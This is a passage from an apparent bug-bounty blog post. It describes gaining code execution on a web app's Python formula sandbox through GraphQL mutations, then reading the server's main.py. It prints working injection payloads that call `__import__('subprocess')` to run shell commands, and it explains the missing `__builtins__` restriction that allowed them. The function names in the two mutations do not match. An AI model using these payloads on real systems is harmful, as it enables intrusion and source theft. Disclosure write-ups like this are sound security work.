# :globe_with_meridians: The vulnerability in the server's own code:

---

## Phase 3: The Whitebox Pivot…!

RCE is a spark, but source code is a floodlight…I used the `subprocess` module to read the server's own heart—its backend logic…!

By executing `cat /workspace/main.py`, I realized the app was importing a module called `python_function.function`…I followed the trail and found the "Smoking Gun" in the sandbox logic:

## Get MPGODMATCH’s stories in your inbox

Join Medium for free to get updates from this writer.

Remember me for faster sign in

Reading main.py:

```
mutation InjectReadFile {
createUserDefinedFunction(input: {
workspaceId: "d6352aa3-9b59-44c9-9beb-cc4d0f260352",
appId: "195306b2-80ca-4fa6-b420-760becb262ea",
function: {
name: "hack_read_main",
minArguments: 0,
maxArguments: 0,
arguments: [],
description: "Exfiltrate Source",
usageExample: "=hack_read_main()",
function: {
pythonScript: "str(__import__('subprocess').check_output(['cat', '/workspace/main.py']))"
}
}
})
}
```

```
mutation TriggerRCE_V3 {
evalFormula(input: {
workspaceId: "d6352aa3-9b59-44c9-9beb-cc4d0f260352",
appId: "195306b2-80ca-4fa6-b420-760becb262ea",
formula: "=hack_rce_main()",
trigger: DATA_TABLE
}) {
displayValue
}
}
```

From the response of Main.py:

```

# The vulnerability in the server's own code:
global_ns = { "xl": xl, "xl_*s": xl_*s }
exec(compile(tree, filename="", mode="exec"), global_ns, global_ns)
```

The Flaw: They passed `global_ns` but forgot to set `__builtins__: {}`. Because of that one missing line, my `__import__` payload worked perfectly…!

I also read many other internal files, also did the SSRF, But I have more interesting impact showing POC…!

---
